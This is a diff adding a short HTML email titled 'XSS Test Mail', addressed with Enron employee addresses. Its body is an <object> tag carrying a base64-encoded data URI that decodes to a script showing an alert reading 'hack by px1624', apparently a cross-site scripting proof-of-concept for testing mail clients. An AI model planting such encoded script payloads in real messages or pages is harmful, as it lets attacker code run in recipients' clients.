@@ -1,0 +1,7 @@
+From: stacey.burnett@enron.com
+To: steven.harris@enron.com, drew.fossum@enron.com, lorna.brennan@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
